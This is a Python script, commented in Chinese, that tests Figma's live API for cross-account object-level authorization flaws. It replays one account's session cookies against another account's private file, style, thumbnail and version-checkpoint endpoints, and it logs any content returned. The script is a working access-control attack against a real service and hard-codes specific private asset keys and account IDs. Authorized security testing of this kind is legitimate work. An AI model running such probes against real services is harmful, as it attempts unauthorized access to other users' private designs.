"""跨用户对象级越权测试：新账号(1667396392129259941) 请求 旧账号(1666382703778278399) 的私有资产

攻击面：
1. POST /api/file_proxy/file/{key}/canvas?nodes_to_extract=&fv=101   —— 旧结论：匿名401（认证层），疑似只查登录
2. GET  /api/file_proxy/style/{key}/canvas?ver=                    —— 旧结论：登录后400（fv参数），匿名403（权限层）
3. GET  /api/file_proxy/style/{key}/thumbnail?ver=                 —— 旧结论：登录200
4. POST /api/design_systems/{teamId}/assets                       —— 提取资产列表
5. GET  /v1/versions/{key}/... 系列（checkpoint 下载面）
6. GET  /api/file_proxy/file/{key} 其他端点探测

私有文件 key: qzDqStIDJyGbthpKiuvfwg  checkpoint: 2354398731758506841
style key: c2f0e9a03b9f7ae6f69b24c8f620bc7839f5ed28  ver: N4l2fHwfqtsjBoJGQMXKc6
"""
import json, sys, urllib.request, urllib.error, ssl

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ctx = ssl.create_default_context()

def load_cookies(f):
    cookies = json.load(open(f, encoding="utf-8"))
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies)

OLD = load_cookies("figma_session.json")      # 旧账号 owner
NEW = load_cookies("figma_session_new.json")  # 新账号 非协作者

def req(label, url, method="GET", cookies=None, body=None, headers=None):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
    if cookies:
        h["Cookie"] = cookies
    if body is not None:
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=25, context=ctx)
        raw = resp.read()
        return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

FK = "qzDqStIDJyGbthpKiuvfwg"   # 旧账号私有文件
STYLE = "c2f0e9a03b9f7ae6f69b24c8f620bc7839f5ed28"
VER = "N4l2fHwfqtsjBoJGQMXKc6"

cases = [
    # (label, method, url, cookies)
    ("[file] 新账号+私有文件 nodes_to_extract=0:1", "POST",
     f"https://www.figma.com/api/file_proxy/file/{FK}/canvas?nodes_to_extract=0:1&fv=101", NEW),
    ("[file] 新账号+私有文件 nodes_to_extract=116:2", "POST",
     f"https://www.figma.com/api/file_proxy/file/{FK}/canvas?nodes_to_extract=116:2&fv=101", NEW),
    ("[style-canvas] 新账号+私有style", "GET",
     f"https://www.figma.com/api/file_proxy/style/{STYLE}/canvas?ver={VER}", NEW),
    ("[style-thumb] 新账号+私有style", "GET",
     f"https://www.figma.com/api/file_proxy/style/{STYLE}/thumbnail?ver={VER}", NEW),
    ("[file] 新账号+私有文件 无fv", "POST",
     f"https://www.figma.com/api/file_proxy/file/{FK}/canvas?nodes_to_extract=0:1", NEW),
    ("[file] 新账号+checkpoint版本画布", "GET",
     f"https://www.figma.com/api/v1/versions/{FK}/canvas?fk={FK}&fv=2354398731758506841", NEW),
]

for label, method, url, ck in cases:
    st, hd, raw = req(label, url, method, ck)
    ct = hd.get("Content-Type", "")[:50]
    if st == 200:
        print(f"{label}: {st} | {ct} | {len(raw)}B | sha256={__import__('hashlib').sha256(raw).hexdigest()[:12]}")
        # fig-kiwij 有魔数可看前8字节
        print(f"    前16字节: {raw[:16].hex()}")
    else:
        print(f"{label}: {st} | {ct} | {raw[:160]}")
